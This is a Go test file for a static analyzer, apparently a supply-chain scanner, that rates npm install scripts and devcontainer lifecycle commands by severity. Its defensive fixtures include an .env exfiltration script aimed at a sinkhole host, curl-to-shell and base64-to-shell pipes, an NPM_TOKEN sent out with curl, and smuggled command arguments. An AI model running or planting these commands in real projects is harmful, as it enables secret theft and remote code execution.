package autoexec_test

import (
	"context"
	"errors"
	"fmt"
	"io/fs"
	"slices"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/static/autoexec"
)

const (
	jsPlain = "'use strict';\nconsole.log('hi');\n"
	jsSpawn = "const { execSync } = require('child_process');\nexecSync('ls');\n"
	// jsExfil reads a secret file and sends it out: critical for the script analyzer.
	jsExfil   = "const fs = require('fs');\nconst https = require('https');\nconst env = fs.readFileSync('../.env', 'utf8');\nhttps.request({ hostname: 'c.sinkhole.test' }).end(env);\n"
	pkgNoLife = `{"scripts":{"start":"node server.js"}}`
	pkgEvil   = `{"scripts":{"postinstall":"npx evil@latest"}}`
	gypPlain  = "{\n  'targets': [{ 'target_name': 'addon', 'sources': ['addon.cc'] }]\n}\n"
	prismaOK  = "generator client {\n  provider = \"prisma-client-js\"\n}\n"
	ngOK      = `{"projects":{"app":{"architect":{"build":{"builder":"@angular-devkit/build-angular:application"}}}}}`
)

// post is a package.json whose postinstall script is cmd.
func post(cmd string) string { return fmt.Sprintf(`{"scripts":{"postinstall":%q}}`, cmd) }

// life is a devcontainer.json whose postCreateCommand is the JSON value.
func life(value string) string { return `{"postCreateCommand": ` + value + `}` }

// chain returns "cd a1 && npm i && cd ../a2 && npm i ..." for n folders.
func chain(n int) string {
	var parts []string
	for i := 1; i <= n; i++ {
		parts = append(parts, fmt.Sprintf("cd ../a%d && npm i", i))
	}
	return "cd a0 && " + strings.Join(parts, " && ")
}

func TestGrade(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path       string
		data       string
		files      map[string]string // other files of the target, by path
		unreadable []string          // paths that exist but cannot be read
		noOpen     bool              // the file cannot read other files (a container member)
		// expectations: "<rule suffix>:<severity>" of every finding, sorted
		want []string
	}{
		// install-time scripts: the success path, then the branches in code order
		{name: "a local tool is low", path: "package.json", data: post("simple-git-hooks"), want: []string{"005:low"}},
		{name: "the last of duplicate script keys is graded", path: "package.json", data: `{"scripts":{"build":"npx evil@latest","build":"tsc","postinstall":"npm run build"}}`, want: []string{"005:low"}},
		{name: "the last of duplicate script keys is graded, unclassifiable last", path: "package.json", data: `{"scripts":{"build":"tsc","build":"npx evil@latest","postinstall":"npm run build"}}`, want: []string{"005:medium"}},
		{name: "a script that is not a string is no script", path: "package.json", data: `{"scripts":{"build":"tsc","build":7,"postinstall":"npm run build"}}`, want: []string{"005:medium"}},
		{name: "without Open a tool needs no neighbor", path: "package.json", data: post("simple-git-hooks"), noOpen: true, want: []string{"005:low"}},
		{name: "without Open a package manager call is medium", path: "package.json", data: post("npm ci"), noOpen: true, want: []string{"005:medium"}},
		{name: "in a container member a package manager call is medium", path: "repo.zip!/package.json", data: post("npm ci"), noOpen: true, want: []string{"005:medium"}},
		{name: "three folders are within the read limit", path: "package.json", data: post(chain(3)), want: []string{"005:low"}},
		{name: "twelve folders are over the read limit", path: "package.json", data: post(chain(12)), want: []string{"005:medium"}},
		{name: "cd out of the target", path: "package.json", data: post("cd .. && npm ci"), want: []string{"005:medium"}},
		{name: "cd to an absolute path", path: "package.json", data: post("cd /tmp && npm ci"), want: []string{"005:medium"}},
		{name: "cd without a folder", path: "package.json", data: post("cd && npm ci"), want: []string{"005:medium"}},
		{name: "cd to the previous folder", path: "package.json", data: post("cd - && npm ci"), want: []string{"005:medium"}},
		{name: "cd home", path: "package.json", data: post("cd ~ && npm ci"), want: []string{"005:medium"}},
		{name: "cd into folders with clean packages", path: "package.json", data: post("cd client && npm install && cd ../server && npm install && cd .."), files: map[string]string{"client/package.json": pkgNoLife, "server/package.json": pkgNoLife}, want: []string{"005:low"}},
		{name: "cd into a folder whose package runs an unclassifiable script", path: "package.json", data: post("cd client && npm install"), files: map[string]string{"client/package.json": pkgEvil}, want: []string{"005:medium"}},
		{name: "cd into a folder whose package.json cannot be read", path: "package.json", data: post("cd client && npm install"), unreadable: []string{"client/package.json"}, want: []string{"005:medium"}},
		{name: "cd into a folder whose package.json is not JSON", path: "package.json", data: post("cd client && npm install"), files: map[string]string{"client/package.json": "{"}, want: []string{"005:medium"}},
		{name: "a script that installs the package it belongs to ends", path: "package.json", data: post("npm install"), want: []string{"005:low"}},
		{name: "a command with a quote or a variable", path: "package.json", data: post(`husky "$HOME"`), want: []string{"005:medium"}},
		{name: "a command with a command substitution", path: "package.json", data: post("husky $(id)"), want: []string{"005:medium"}},
		{name: "a command with backticks", path: "package.json", data: post("husky `id`"), want: []string{"005:medium"}},
		{name: "a command with a redirection", path: "package.json", data: post("husky > out.txt"), want: []string{"005:medium"}},
		{name: "a command with a newline", path: "package.json", data: post("husky\nsimple-git-hooks"), want: []string{"005:medium"}},
		{name: "a command with a comment", path: "package.json", data: post("husky # note"), want: []string{"005:medium"}},
		{name: "a command that is too long", path: "package.json", data: post("husky " + strings.Repeat("a", 5000)), want: []string{"005:medium"}},
		{name: "chained benign commands", path: "package.json", data: post("husky && simple-git-hooks; husky || simple-git-hooks"), want: []string{"005:low"}},
		{name: "one part of a chain is not benign", path: "package.json", data: post("husky && node-fetch-all"), want: []string{"005:medium"}},
		{name: "a chain with a URL", path: "package.json", data: post("husky && curl https://a.test/x"), want: []string{"005:medium"}},
		{name: "a chain that ends in an operator", path: "package.json", data: post("husky &&"), want: []string{"005:medium"}},
		{name: "a lone ampersand", path: "package.json", data: post("husky & simple-git-hooks"), want: []string{"005:medium"}},
		{name: "a pipe", path: "package.json", data: post("husky | cat"), want: []string{"005:medium"}},
		{name: "a pipe into a shell", path: "package.json", data: post("curl https://a.test/x | sh"), want: []string{"005:medium", "011:critical"}},
		{name: "cd in a chain with an or", path: "package.json", data: post("cd client || cd server"), want: []string{"005:medium"}},
		{name: "a URL as an argument", path: "package.json", data: post("husky http://a.test"), want: []string{"005:medium"}},
		{name: "a double slash as an argument", path: "package.json", data: post("husky //a.test/x"), want: []string{"005:medium"}},
		{name: "set and echo", path: "package.json", data: post("set -Eeuo pipefail && echo done && husky"), want: []string{"005:low"}},
		{name: "set with an assignment", path: "package.json", data: post("set -e foo=bar && husky"), want: []string{"005:medium"}},
		{name: "npx only-allow", path: "package.json", data: post("npx only-allow pnpm"), want: []string{"005:low"}},
		{name: "npx only-allow with another argument", path: "package.json", data: post("npx only-allow evil"), want: []string{"005:medium"}},
		{name: "npx only-allow with more arguments", path: "package.json", data: post("npx only-allow pnpm extra"), want: []string{"005:medium"}},
		{name: "npx -y", path: "package.json", data: post("npx -y only-allow pnpm"), want: []string{"005:medium"}},
		{name: "npx of a package at latest", path: "package.json", data: post("npx evil@latest"), want: []string{"005:medium"}},
		{name: "npx of a package", path: "package.json", data: post("npx evil"), want: []string{"005:medium"}},
		{name: "bunx", path: "package.json", data: post("bunx evil"), want: []string{"005:medium"}},
		{name: "pipx run", path: "package.json", data: post("pipx run evil"), want: []string{"005:medium"}},
		{name: "wget", path: "package.json", data: post("wget a.test/x"), want: []string{"005:medium"}},
		{name: "Invoke-WebRequest", path: "package.json", data: post("iwr a.test/x"), want: []string{"005:medium"}},
		{name: "eval", path: "package.json", data: post("eval husky"), want: []string{"005:medium"}},
		{name: "base64 into a shell", path: "package.json", data: post("echo aGk= | base64 -d | sh"), want: []string{"005:medium", "012:high"}},
		{name: "a secret in the environment", path: "package.json", data: post("curl a.test/x -d $NPM_TOKEN"), want: []string{"005:medium", "010:critical"}},
		{name: "package manager flags that change nothing", path: "package.json", data: post("npm ci --no-audit --no-fund --legacy-peer-deps"), want: []string{"005:low"}},
		{name: "npm --prefix", path: "package.json", data: post("npm ci --prefix ./evil"), want: []string{"005:medium"}},
		{name: "npm --script-shell", path: "package.json", data: post("npm install --script-shell ./evil.sh"), want: []string{"005:medium"}},
		{name: "npm --userconfig", path: "package.json", data: post("npm ci --userconfig ./evil.npmrc"), want: []string{"005:medium"}},
		{name: "npm --registry", path: "package.json", data: post("npm ci --registry=https://evil.test"), want: []string{"005:medium"}},
		{name: "ignore-scripts does not run the package's own scripts", path: "package.json", data: `{"scripts":{"postinstall":"npm ci --ignore-scripts","prepare":"npx evil@latest"}}`, want: []string{"005:low", "006:low"}},
		{name: "the prepare script of the package runs on install", path: "package.json", data: `{"scripts":{"postinstall":"npm ci","prepare":"npx evil@latest"}}`, want: []string{"005:medium", "006:low"}},
		{name: "a local prepare script with a finding", path: "package.json", data: `{"scripts":{"postinstall":"npm install","prepare":"node scripts/evil.js"}}`, files: map[string]string{"scripts/evil.js": jsExfil}, want: []string{"005:medium", "006:low"}},
		{name: "a local prepare script without findings", path: "package.json", data: `{"scripts":{"postinstall":"npm install","prepare":"node scripts/ok.js"}}`, files: map[string]string{"scripts/ok.js": jsPlain}, want: []string{"005:low", "006:low"}},
		{name: "a preinstall script that is not benign", path: "package.json", data: `{"scripts":{"preinstall":"npx evil@latest","postinstall":"npm ci"}}`, want: []string{"005:medium", "005:medium"}},
		{name: "every install variant", path: "package.json", data: post("npm i && npm rebuild && yarn && yarn install --frozen-lockfile && pnpm i && pnpm install --prod && bun install"), want: []string{"005:low"}},
		{name: "bun with a bunfig.toml", path: "package.json", data: post("bun install"), files: map[string]string{"bunfig.toml": "preload = [\"./x.js\"]\n"}, want: []string{"005:medium"}},
		{name: "install of a named package", path: "package.json", data: post("npm install left-pad"), want: []string{"005:medium"}},
		{name: "yarn add", path: "package.json", data: post("yarn add left-pad"), want: []string{"005:medium"}},
		{name: "global install", path: "package.json", data: post("npm install -g left-pad"), want: []string{"005:medium"}},
		{name: "run a script of the package", path: "package.json", data: `{"scripts":{"postinstall":"npm run build","build":"tsc"}}`, want: []string{"005:low"}},
		{name: "every way to run a script", path: "package.json", data: `{"scripts":{"postinstall":"npm run-script build && yarn run build && pnpm run build && bun run build && yarn build && pnpm build && yarn prepare","build":"tsc","prepare":"husky"}}`, want: []string{"005:low", "006:low"}},
		{name: "a script name with a colon", path: "package.json", data: `{"scripts":{"postinstall":"npm run build:prod","build:prod":"tsc"}}`, want: []string{"005:low"}},
		{name: "a script that does not exist", path: "package.json", data: post("npm run missing"), want: []string{"005:medium"}},
		{name: "run without a script name", path: "package.json", data: post("npm run"), want: []string{"005:medium"}},
		{name: "run with an extra argument", path: "package.json", data: `{"scripts":{"postinstall":"npm run build extra","build":"tsc"}}`, want: []string{"005:medium"}},
		{name: "a bare script name that is not build or prepare", path: "package.json", data: `{"scripts":{"postinstall":"yarn test","test":"tsc"}}`, want: []string{"005:medium"}},
		{name: "another package manager command", path: "package.json", data: post("npm publish"), want: []string{"005:medium"}},
		{name: "a pre script that is not benign", path: "package.json", data: `{"scripts":{"postinstall":"npm run build","prebuild":"npx evil@latest","build":"tsc"}}`, want: []string{"005:medium"}},
		{name: "a post script that is not benign", path: "package.json", data: `{"scripts":{"postinstall":"npm run build","postbuild":"npx evil@latest","build":"tsc"}}`, want: []string{"005:medium"}},
		{name: "a script that runs a script", path: "package.json", data: `{"scripts":{"postinstall":"npm run build","build":"npm run compile","compile":"tsc"}}`, want: []string{"005:low"}},
		{name: "scripts nested too deeply", path: "package.json", data: `{"scripts":{"postinstall":"npm run a","a":"npm run b","b":"npm run c","c":"npm run d","d":"npm run e","e":"npm run f","f":"tsc"}}`, want: []string{"005:medium"}},
		{name: "a script that is not benign", path: "package.json", data: `{"scripts":{"postinstall":"npm run build","build":"curl a.test/x"}}`, want: []string{"005:medium"}},
		{name: "a clean npmrc", path: "package.json", data: post("npm ci"), files: map[string]string{".npmrc": "save-exact=true\n"}, want: []string{"005:low"}},
		{name: "an npmrc that sets the script shell", path: "package.json", data: post("npm ci"), files: map[string]string{".npmrc": "script-shell=./evil.sh\n"}, want: []string{"005:medium"}},
		{name: "an npmrc that cannot be read", path: "package.json", data: post("npm ci"), unreadable: []string{".npmrc"}, want: []string{"005:medium"}},
		{name: "an npmrc at the root that sets a registry", path: "app/package.json", data: post("npm ci"), files: map[string]string{".npmrc": "registry=https://evil.test/\n"}, want: []string{"005:medium"}},
		{name: "a yarnrc.yml with a committed yarn release", path: "package.json", data: post("yarn install"), files: map[string]string{".yarnrc.yml": "yarnPath: .yarn/releases/yarn-4.5.0.cjs\n"}, want: []string{"005:medium"}},
		{name: "a pnpmfile", path: "package.json", data: post("pnpm install"), files: map[string]string{".pnpmfile.cjs": "module.exports = {}\n"}, want: []string{"005:medium"}},
		{name: "husky install", path: "package.json", data: post("husky install .husky"), want: []string{"005:low"}},
		{name: "husky with an unknown argument", path: "package.json", data: post("husky add"), want: []string{"005:medium"}},
		{name: "simple-git-hooks with a flag", path: "package.json", data: post("simple-git-hooks --x"), want: []string{"005:medium"}},
		{name: "patch-package with flags", path: "package.json", data: post("patch-package --exclude nothing"), want: []string{"005:low"}},
		{name: "lefthook install", path: "package.json", data: post("lefthook install"), want: []string{"005:low"}},
		{name: "lefthook run", path: "package.json", data: post("lefthook run pre-commit"), want: []string{"005:medium"}},
		{name: "tsc with flags", path: "package.json", data: post("tsc --noEmit -p tsconfig.json"), want: []string{"005:low"}},
		{name: "tsc with a file", path: "package.json", data: post("tsc index.ts"), want: []string{"005:medium"}},
		{name: "ng build", path: "package.json", data: post("ng build"), files: map[string]string{"angular.json": ngOK}, want: []string{"005:low"}},
		{name: "ng build with a builder given as a path", path: "package.json", data: post("ng build"), files: map[string]string{"angular.json": `{"architect":{"build":{"builder": "./tools/builder:build"}}}`}, want: []string{"005:medium"}},
		{name: "ng build without angular.json", path: "package.json", data: post("ng build"), want: []string{"005:medium"}},
		{name: "an unknown tool", path: "package.json", data: post("node-fetch-all"), want: []string{"005:medium"}},
		{name: "node-gyp rebuild", path: "package.json", data: post("node-gyp rebuild"), files: map[string]string{"binding.gyp": gypPlain}, want: []string{"005:low"}},
		{name: "node-gyp rebuild with a command expansion", path: "package.json", data: post("node-gyp rebuild"), files: map[string]string{"binding.gyp": "{'x': '<!@(pkg-config ./local.pc --cflags)'}\n"}, want: []string{"005:medium"}},
		{name: "node-gyp rebuild with actions", path: "package.json", data: post("node-gyp rebuild"), files: map[string]string{"binding.gyp": "{'targets': [{'actions': [{'action_name': 'gen'}]}]}\n"}, want: []string{"005:medium"}},
		{name: "node-gyp rebuild without binding.gyp", path: "package.json", data: post("node-gyp rebuild"), want: []string{"005:medium"}},
		{name: "node-gyp rebuild with a flag", path: "package.json", data: post("node-gyp rebuild --target=1.0.0"), files: map[string]string{"binding.gyp": gypPlain}, want: []string{"005:medium"}},
		{name: "prisma generate", path: "package.json", data: post("prisma generate --no-engine"), files: map[string]string{"prisma/schema.prisma": prismaOK}, want: []string{"005:low"}},
		{name: "prisma generate with the schema at the root", path: "package.json", data: post("prisma generate"), files: map[string]string{"schema.prisma": prismaOK}, want: []string{"005:low"}},
		{name: "prisma generate with --schema=", path: "package.json", data: post("prisma generate --schema=db/main.prisma"), files: map[string]string{"db/main.prisma": prismaOK}, want: []string{"005:low"}},
		{name: "prisma generate with --schema and a value", path: "package.json", data: post("prisma generate --schema db/main.prisma"), files: map[string]string{"db/main.prisma": prismaOK}, want: []string{"005:low"}},
		{name: "prisma generate with a generator that runs a command", path: "package.json", data: post("prisma generate"), files: map[string]string{"prisma/schema.prisma": "generator a {\n  provider = \"node ./gen.js\"\n}\n"}, want: []string{"005:medium"}},
		{name: "prisma generate with a schema outside the target", path: "package.json", data: post("prisma generate --schema=../x.prisma"), want: []string{"005:medium"}},
		{name: "prisma generate with a config file", path: "package.json", data: post("prisma generate"), files: map[string]string{"prisma/schema.prisma": prismaOK, "prisma.config.ts": "export default {}\n"}, want: []string{"005:medium"}},
		{name: "prisma generate without a schema", path: "package.json", data: post("prisma generate"), want: []string{"005:medium"}},
		{name: "prisma migrate", path: "package.json", data: post("prisma migrate deploy"), want: []string{"005:medium"}},
		{name: "a local JavaScript file", path: "package.json", data: post("node scripts/x.js --verbose"), files: map[string]string{"scripts/x.js": jsPlain}, want: []string{"005:low"}},
		{name: "a local JavaScript file that only spawns a command", path: "package.json", data: post("node ./scripts/x.mjs"), files: map[string]string{"scripts/x.mjs": jsSpawn}, want: []string{"005:low"}},
		{name: "a local JavaScript file with a critical finding", path: "package.json", data: post("node scripts/x.js"), files: map[string]string{"scripts/x.js": jsExfil}, want: []string{"005:medium"}},
		{name: "a local Python file", path: "package.json", data: post("python3 scripts/x.py"), files: map[string]string{"scripts/x.py": "print('hi')\n"}, want: []string{"005:low"}},
		{name: "a local script beside a package.json in a folder", path: "app/package.json", data: post("node scripts/x.js"), files: map[string]string{"app/scripts/x.js": jsPlain}, want: []string{"005:low"}},
		{name: "a local script that is missing", path: "package.json", data: post("node scripts/x.js"), want: []string{"005:medium"}},
		{name: "a local script outside the target", path: "package.json", data: post("node ../x.js"), want: []string{"005:medium"}},
		{name: "a local script given as an absolute path", path: "package.json", data: post("node /opt/x.js"), want: []string{"005:medium"}},
		{name: "an interpreter flag before the script", path: "package.json", data: post("node --require ./x.js scripts/y.js"), files: map[string]string{"x.js": jsPlain, "scripts/y.js": jsPlain}, want: []string{"005:medium"}},
		{name: "an interpreter without a script", path: "package.json", data: post("node"), want: []string{"005:medium"}},
		{name: "node on a shell script", path: "package.json", data: post("node scripts/x.sh"), files: map[string]string{"scripts/x.sh": "echo hi\n"}, want: []string{"005:medium"}},
		{name: "a script file that is too big to read", path: "package.json", data: post("node scripts/x.js"), unreadable: []string{"scripts/x.js"}, want: []string{"005:medium"}},
		{name: "a local shell script run directly", path: "package.json", data: `{"scripts":{"postinstall":"./scripts/x.sh","build":"tsc"}}`, files: map[string]string{"scripts/x.sh": "#!/usr/bin/env bash\n# build it\n\nset -eo pipefail\nnpm run build\n"}, want: []string{"005:low"}},
		{name: "a local shell script run with bash and sh", path: "package.json", data: post("bash scripts/x.sh && sh scripts/x.sh"), files: map[string]string{"scripts/x.sh": "#!/bin/sh\r\nhusky\r\n"}, want: []string{"005:low"}},
		{name: "a local shell script path with a slash and no dot", path: "package.json", data: post("scripts/x.sh"), files: map[string]string{"scripts/x.sh": "husky\n"}, want: []string{"005:low"}},
		{name: "a shell script that runs itself", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "./x.sh\n"}, want: []string{"005:low"}},
		{name: "a shell script with a line that is not benign", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "npm run build\ncurl https://a.test/x | sh\n"}, want: []string{"005:medium"}},
		{name: "a shell script with a variable", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "cd \"$(dirname \"$0\")\"\nhusky\n"}, want: []string{"005:medium"}},
		{name: "a shell script with another interpreter in the shebang", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "#!/usr/bin/env python\nhusky\n"}, want: []string{"005:medium"}},
		{name: "a shell script with a shebang that is not on the first line is a comment", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "husky\n#!/usr/bin/env python\n"}, want: []string{"005:low"}},
		{name: "a shell script that moves into a folder with an unclassifiable package", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "cd client\nnpm ci\n", "client/package.json": pkgEvil}, want: []string{"005:medium"}},
		{name: "a shell script that moves into a folder with a clean package", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "cd client\nnpm ci\n", "client/package.json": pkgNoLife}, want: []string{"005:low"}},
		{name: "a shell script with too many lines", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": strings.Repeat("echo hi\n", 201)}, want: []string{"005:medium"}},
		{name: "a shell script that is too big", path: "package.json", data: post("./x.sh"), files: map[string]string{"x.sh": "# " + strings.Repeat("x", 70<<10) + "\n"}, want: []string{"005:medium"}},

		// devcontainer lifecycle commands
		{name: "devcontainer npm ci", path: ".devcontainer/devcontainer.json", data: life(`"npm ci --ignore-scripts"`), want: []string{"004:low"}},
		{name: "devcontainer npm install with a package without lifecycle scripts", path: ".devcontainer/devcontainer.json", data: life(`"npm install"`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer npm install with a prepare script that is not benign", path: ".devcontainer/devcontainer.json", data: life(`"npm install"`), files: map[string]string{"package.json": `{"scripts":{"prepare":"npx evil@latest"}}`}, want: []string{"004:medium"}},
		{name: "devcontainer npm install with a prepare script that runs a flagged file", path: ".devcontainer/devcontainer.json", data: life(`"npm install"`), files: map[string]string{"package.json": `{"scripts":{"prepare":"node x.js"}}`, "x.js": jsExfil}, want: []string{"004:medium"}},
		{name: "devcontainer command as an array", path: ".devcontainer/devcontainer.json", data: life(`["npm", "ci"]`), want: []string{"004:low"}},
		{name: "devcontainer array that smuggles a second command", path: ".devcontainer/devcontainer.json", data: life(`["npm", "ci", ";", "evil"]`), want: []string{"004:medium"}},
		{name: "devcontainer parallel commands", path: ".devcontainer/devcontainer.json", data: life(`{"a": "npm ci", "b": ["husky"]}`), want: []string{"004:low"}},
		{name: "devcontainer parallel commands with one that is not benign", path: ".devcontainer/devcontainer.json", data: life(`{"a": "npm ci", "b": "pip install -r requirements.txt"}`), want: []string{"004:medium"}},
		{name: "devcontainer command that is not a string", path: ".devcontainer/devcontainer.json", data: life(`7`), want: []string{"004:medium"}},
		{name: "devcontainer empty command", path: ".devcontainer/devcontainer.json", data: life(`""`), want: []string{"004:medium"}},
		{name: "devcontainer commands graded one by one", path: ".devcontainer/devcontainer.json", data: `{"onCreateCommand": "npm ci", "postStartCommand": "curl https://a.test/x | sh"}`, want: []string{"004:low", "004:medium", "011:critical"}},
		{name: "devcontainer pip -r", path: ".devcontainer/devcontainer.json", data: life(`"pip install -r requirements.txt"`), want: []string{"004:medium"}},
		{name: "devcontainer with containerEnv", path: ".devcontainer/devcontainer.json", data: `{"containerEnv": {"NODE_OPTIONS": "--require ./evil.js"}, "postCreateCommand": "npm ci"}`, want: []string{"004:medium"}},
		{name: "devcontainer with remoteEnv", path: ".devcontainer/devcontainer.json", data: `{"remoteEnv": {"PATH": "/work/bin:${containerEnv:PATH}"}, "postCreateCommand": "npm ci"}`, want: []string{"004:medium"}},
		{name: "devcontainer with workspaceFolder", path: ".devcontainer/devcontainer.json", data: `{"workspaceFolder": "/workspaces/repo/evil", "postCreateCommand": "npm ci"}`, want: []string{"004:medium"}},
		{name: "devcontainer with workspaceMount", path: ".devcontainer/devcontainer.json", data: `{"workspaceMount": "source=evil,target=/w,type=bind", "postCreateCommand": "npm ci"}`, want: []string{"004:medium"}},
		{name: "devcontainer script run from the workspace folder", path: ".devcontainer/devcontainer.json", data: life(`".devcontainer/setup.sh"`), files: map[string]string{".devcontainer/setup.sh": "#!/bin/bash\nset -e\nnpm run build\n", "package.json": `{"scripts":{"build":"tsc"}}`}, want: []string{"004:low"}},
		{name: "devcontainer script that installs with pip", path: ".devcontainer/devcontainer.json", data: life(`".devcontainer/setup.sh"`), files: map[string]string{".devcontainer/setup.sh": "#!/bin/bash\nset -e\npip install -r requirements/dev.txt\n"}, want: []string{"004:medium"}},
		{name: "devcontainer.json at the root of the target", path: ".devcontainer.json", data: life(`"./setup.sh"`), files: map[string]string{"setup.sh": "husky\n"}, want: []string{"004:low"}},
		{name: "devcontainer below a folder runs in that folder", path: "app/.devcontainer/devcontainer.json", data: life(`"./setup.sh"`), files: map[string]string{"app/setup.sh": "husky\n"}, want: []string{"004:low"}},
		{name: "devcontainer in a container member", path: "repo.zip!/.devcontainer/devcontainer.json", data: life(`"npm ci"`), noOpen: true, want: []string{"004:medium"}},
		{name: "devcontainer that does not parse is lexical and stays medium", path: ".devcontainer/devcontainer.json", data: `{"postCreateCommand": "npm ci",`, want: []string{"004:medium"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := analyze.File{Path: tt.path, Name: tt.path[strings.LastIndex(tt.path, "/")+1:], Data: []byte(tt.data)}
			if strings.Contains(tt.path, "!/") {
				f.Member = tt.path[strings.Index(tt.path, "!/")+2:]
			}
			if !tt.noOpen {
				f.Open = func(rel string) ([]byte, error) {
					if slices.Contains(tt.unreadable, rel) {
						return nil, errors.New("permission denied")
					}
					if data, ok := tt.files[rel]; ok {
						return []byte(data), nil
					}
					return nil, fmt.Errorf("open %s: %w", rel, fs.ErrNotExist)
				}
			}

			out, err := autoexec.New().Analyze(context.Background(), f)

			if err != nil {
				t.Fatal(err)
			}
			var got []string
			for _, fd := range out.Findings {
				got = append(got, fmt.Sprintf("%s:%s", strings.TrimPrefix(fd.RuleID, "GAL-AUTOEXEC-"), fd.Severity))
			}
			slices.Sort(got)
			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %q, want %q", got, tt.want)
			}
		})
	}
}
